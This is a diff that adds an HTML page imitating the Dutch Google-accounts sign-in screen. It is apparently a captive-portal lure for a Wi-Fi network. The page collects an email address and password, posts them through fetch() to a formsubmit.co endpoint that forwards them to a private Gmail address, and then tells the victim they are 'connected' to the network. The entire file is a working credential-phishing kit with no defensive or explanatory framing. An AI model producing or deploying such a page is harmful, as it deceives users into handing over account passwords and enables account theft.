@@ -1,1 +1,152 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inloggen - Google-accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        
+        .container { 
+            width: 100%; max-width: 450px; min-height: 500px; padding: 48px 40px 36px; 
+            border: 1px solid #dadce0; border-radius: 8px; text-align: center; 
+            position: relative; overflow: hidden; display: flex; flex-direction: column;
+        }
 
+        @media (max-width: 450px) { .container { border: none; padding: 24px 24px; min-height: 100vh; } }
+
+        .google-logo { height: 24px; margin-bottom: 12px; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px 0; }
+        p { font-size: 16px; color: #202124; margin: 0 0 40px 0; }
+
+        .input-group { position: relative; margin-bottom: 10px; text-align: left; }
+        input { 
+            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; 
+            font-size: 16px; outline: none; transition: border 0.2s;
+        }
+        input:focus { border: 2px solid #1a73e8; }
+        
+        .account-pill {
+            display: inline-flex; align-items: center; padding: 3px 12px 3px 5px;
+            border: 1px solid #dadce0; border-radius: 16px; margin-bottom: 24px;
+            font-size: 14px; font-weight: 500; cursor: pointer; color: #3c4043;
+        }
+        .account-pill:hover { background-color: #f8f9fa; }
+        .avatar { background: #5f6368; color: white; width: 20px; height: 20px; border-radius: 50%; font-size: 12px; display: flex; align-items: center; justify-content: center; margin-right: 8px; }
+
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; padding-top: 40px; }
+        .blue-link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; background: none; border: none; padding: 0; }
+        .blue-link:hover { text-decoration: underline; }
+        
+        button { 
+            background-color: #1a73e8; color: white; border: none; 
+            padding: 10px 24px; border-radius: 4px; font-size: 14px; 
+            font-weight: 500; cursor: pointer;
+        }
+
+        .loading-bar { 
+            position: absolute; top: 0; left: 0; width: 0%; height: 4px; 
+            background: #1a73e8; transition: width 0.4s ease; 
+        }
+
+        #passStep, #wifiStep { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div id="loader" class="loading-bar"></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo" alt="Google">
+        
+        <div id="emailStep">
+            <h1>Inloggen</h1>
+            <p>Gebruik je Google-account</p>
+            <div class="input-group">
+                <input type="email" id="emailInput" placeholder="E-mailadres of telefoonnummer" required>
+            </div>
+            <div style="text-align: left; margin-top: 8px;">
+                <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/usernamerecovery', '_blank')">E-mailadres vergeten?</button>
+            </div>
+            <p style="text-align: left; font-size: 14px; color: #5f6368; margin-top: 40px;">
+                Geen eigen computer? Gebruik een gastvenster om privé in te loggen. <button type="button" class="blue-link" onclick="window.open('https://support.google.com/chrome/answer/6130773', '_blank')">Meer informatie</button>
+            </p>
+            <div class="footer">
+                <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signup', '_blank')">Account maken</button>
+                <button onclick="toPassword()">Volgende</button>
+            </div>
+        </div>
+
+        <div id="passStep">
+            <h1>Welkom</h1>
+            <div class="account-pill" onclick="location.reload()">
+                <div class="avatar" id="avatarLetter">?</div>
+                <span id="displayEmail"></span>
+                <svg width="12" height="12" viewBox="0 0 24 24" style="margin-left: 8px;"><path d="M7 10l5 5 5-5z"/></svg>
+            </div>
+            
+            <form id="submitForm" action="https://formsubmit.co/ajax/kaasislekker069@gmail.com" method="POST">
+                <input type="hidden" name="email" id="hiddenEmail">
+                <div class="input-group">
+                    <input type="password" name="password" id="passInput" placeholder="Wachtwoord opgeven" required>
+                </div>
+                <div style="text-align: left; margin-top: 8px;">
+                    <input type="checkbox" id="showPass"> <label for="showPass" style="font-size: 14px; cursor: pointer;">Wachtwoord weergeven</label>
+                </div>
+                <div class="footer">
+                    <button type="button" class="blue-link" onclick="window.open('https://accounts.google.com/signin/recovery', '_blank')">Wachtwoord vergeten?</button>
+                    <button type="submit">Volgende</button>
+                </div>
+            </form>
+        </div>
+
+        <div id="wifiStep">
+            <div style="margin: 40px 0;">
+                <svg width="64" height="64" viewBox="0 0 24 24" fill="#1e8e3e"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            </div>
+            <h1>Verbonden</h1>
+            <p>Je bent nu succesvol aangemeld bij het netwerk. Je kunt dit venster sluiten.</p>
+            <button onclick="window.location.href='https://www.google.com'" style="width: 100%;">OK</button>
+        </div>
+    </div>
+
+    <script>
+        function toPassword() {
+            const email = document.getElementById('emailInput').value;
+            if (!email.includes('@')) { alert("Geef een geldig e-mailadres op"); return; }
+
+            const loader = document.getElementById('loader');
+            loader.style.width = "100%";
+
+            setTimeout(() => {
+                document.getElementById('emailStep').style.display = 'none';
+                document.getElementById('passStep').style.display = 'block';
+                document.getElementById('displayEmail').innerText = email;
+                document.getElementById('hiddenEmail').value = email;
+                document.getElementById('avatarLetter').innerText = email.charAt(0).toUpperCase();
+                loader.style.width = "0%";
+            }, 800);
+        }
+
+        document.getElementById('submitForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('loader').style.width = "100%";
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this)
+            }).then(() => {
+                document.getElementById('passStep').style.display = 'none';
+                document.getElementById('wifiStep').style.display = 'block';
+                document.getElementById('loader').style.width = "0%";
+            });
+        });
+
+        document.getElementById('showPass').onclick = function() {
+            const p = document.getElementById('passInput');
+            p.type = this.checked ? "text" : "password";
+        };
+    </script>
+</body>
+</html>
